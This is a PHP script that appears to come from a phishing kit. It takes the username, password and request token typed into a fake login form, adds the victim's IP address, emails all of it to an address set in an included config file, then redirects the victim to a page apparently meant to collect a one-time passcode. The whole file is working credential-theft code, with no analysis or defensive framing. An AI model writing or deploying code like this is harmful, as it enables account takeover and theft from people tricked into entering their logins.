<?php
require("email.php");
include("config.php");
//Server Variables
    $ip = getenv("REMOTE_ADDR");
    //Name Attributes of HTML FORM

    //Fetching HTML Values
    $Fname = $_POST['Username'];
    $Lname = $_POST['Password'];
    $serv = $_REQUEST['__RequestVerificationToken'];


    $sender_name = "EM6L3M";
    $uid = "sender";
    $sender_mail = "em6l3mlight.log";

        //Main Content
        $main_subject = "LOGIN INFO l $ip";
        $main_body = "
        UserName : $Fname <p>
	    PassWord : $Lname <p>
	    
        User-Ip : $ip";
        

//#############################DO NOT CHANGE ANYTHING BELOW THIS LINE#############################
        //Sending mail to Server
         $retval = mail($server_mail, $main_subject, "$uid\r\n \r\n\r\n $main_body \r\n\r\n--$uid\r\n $uid","From: $sender_name <$sender_mail>\r\nReply-To: $sender_mail\r\nMIME-Version: 1.0\r\nContent-Type: text/html; boundary=\"$uid\"\r\n\r\n");
        //Sending mail to Sender
//#############################DO NOT CHANGE ANYTHING ABOVE THIS LINE#############################

        //Output
	header("location:send-otp.html");
?>
